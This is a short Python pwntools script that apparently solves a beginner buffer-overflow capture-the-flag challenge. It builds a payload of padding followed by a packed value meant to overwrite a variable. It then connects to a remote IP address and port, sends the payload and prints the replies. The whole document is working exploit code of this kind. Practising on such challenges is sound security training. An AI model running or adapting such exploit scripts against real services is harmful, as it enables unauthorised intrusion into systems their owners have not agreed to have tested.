from pwn import *

payload = 'a' * (0x6c - 0x68) + p64(0x6e756161)

r = remote('111.198.29.45', 58350)

r.recvuntil('lets get helloworld for bof')
r.sendline(payload)


print r.recv()
print r.recv()
